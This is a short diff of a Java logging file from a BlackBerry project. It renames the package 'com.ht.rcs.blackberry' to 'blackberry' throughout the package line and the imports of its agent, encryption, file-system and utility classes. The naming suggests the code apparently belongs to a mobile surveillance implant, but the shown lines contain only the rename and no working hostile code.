@@ -5,7 +5,7 @@
  * File         : Log.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.log;
+package blackberry.log;
 
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -17,16 +17,16 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.util.DataBuffer;
 
-import com.ht.rcs.blackberry.Device;
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.fs.Path;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.DateTime;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
-import com.ht.rcs.blackberry.utils.WChar;
+import blackberry.Device;
+import blackberry.agent.Agent;
+import blackberry.crypto.Encryption;
+import blackberry.fs.Path;
+import blackberry.utils.Check;
+import blackberry.utils.DateTime;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 /*  LOG FORMAT
  *
